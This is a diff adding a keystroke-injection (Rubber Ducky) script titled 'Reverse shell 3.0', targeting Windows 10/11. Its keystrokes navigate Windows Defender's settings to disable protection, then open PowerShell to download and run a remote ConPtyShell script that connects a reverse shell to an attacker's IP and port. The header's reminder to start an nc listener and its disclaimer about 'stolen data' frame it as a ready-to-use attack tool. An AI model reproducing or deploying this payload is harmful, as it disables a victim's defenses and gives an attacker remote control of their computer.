@@ -1,0 +1,47 @@
+###############################################################################################
+ REM                 Title:    Reverse shell 3.0                                              #                          
+ REM                 Description: Disable Windows Defender and make Reverse Shell <WORKING>   #   
+ REM                 Props: MajoesQ                                                           #
+ REM                  Targets: Windows 10/11                                                  #
+ REM                 MajoesQ assumes no responsibility for any damages or stolen data.        #
+ REM                 DON'T FORGET TO START LISTENER "nc -lvnp PORT                            #
+ REM                  DON'T FORGET TO CHANGE ATACKERS IP AND PORT IN LINE  44                 #                       
+###############################################################################################
+REM    ENJOY :}
+REM   This disables Windows Defender
+DELAY 1500
+GUI r
+DELAY 250
+STRING windowsdefender://threat/
+DELAY 500
+ENTER
+DELAY 1500
+DOWN
+DELAY 350
+DOWN
+DELAY 350
+DOWN
+DELAY 350
+DOWN
+DELAY 350
+DOWN
+DELAY 300
+ENTER
+DELAY 500
+SPACE
+DELAY 1000
+LEFT
+DELAY 200
+ENTER
+DELAY 1500
+REM This starts a Revershe Shell
+GUI r
+DELAY 150
+STRING  powershell 
+DELAY 500
+ENTER
+DELAY 600
+STRING  IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell IPADRESS PORT
+DELAY 350
+ENTER
+REM This is end #########################################################################################################################################################
